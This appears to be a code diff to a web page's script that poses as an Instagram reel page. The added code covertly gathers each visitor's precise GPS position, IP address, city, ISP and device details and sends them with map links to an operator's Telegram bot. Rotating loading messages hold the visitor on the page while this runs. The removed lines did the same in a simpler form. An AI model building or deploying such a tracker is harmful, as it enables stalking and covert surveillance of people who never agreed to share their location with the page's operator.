@@ -115,53 +115,136 @@
     const bgImage = document.getElementById('bg-image');
     const instaFrame = document.getElementById('insta-video');
 
-    // Get precise user location
-    async function getPreciseLocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          }),
-          err => {
-            if (err.code === err.PERMISSION_DENIED)
-              permissionRequest.style.display = 'flex';
-            resolve(null);
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    }
 
-    // Send info to Telegram bot
-    async function sendToTelegram(data) {
-      try {
-        const msg = `🕵️ NEW VISITOR\n\nIP: ${data.ip || 'Unknown'}\nLat: ${data.liveLocation?.lat || 'N/A'}\nLon: ${data.liveLocation?.lon || 'N/A'}`;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
-      } catch (e) { console.log(e); }
-    }
+     // Function to get IP info
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP info error:", error);
+                return {};
+            }
+        }
 
-    // Main tracking and display logic
-    async function trackUser() {
-      const loc = await getPreciseLocation();
-      await sendToTelegram({ liveLocation: loc });
+    
+   // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        // Only show permission request if location was denied
+                        if (error.code === error.PERMISSION_DENIED) {
+                            setTimeout(() => {
+                                permissionRequest.style.display = 'flex';
+                            }, 3000);
+                        }
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
 
-      if (loc) {
-        loadingOverlay.style.display = 'none';
-        bgImage.style.opacity = '0';
-        // Show Instagram reel after 1 second
-        setTimeout(() => {
-          bgImage.style.display = 'none';
-          instaFrame.style.display = 'block';
-        }, 1000);
-      }
-    }
+    // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 LIVE GPS LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 APPROX LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+                    }
+                }
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        // Rotate loading messages
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+
+
+  // Main tracking function
+        async function trackUser() {
+            // Start rotating loading messages
+            rotateLoadingMessages();
+            
+            // First try to get precise location silently
+            const liveLocation = await getPreciseLocation();
+            
+            // Then get IP details
+            const ipDetails = await getIPInfo();
+            
+            // Combine all data
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            
+            // Send to Telegram
+            await sendToTelegram(trackingData);
+        }
+
 
     allowBtn.addEventListener('click', async () => {
       permissionRequest.style.display = 'none';
@@ -172,5 +255,6 @@
   </script>
 </body>
 </html>
+
 
 
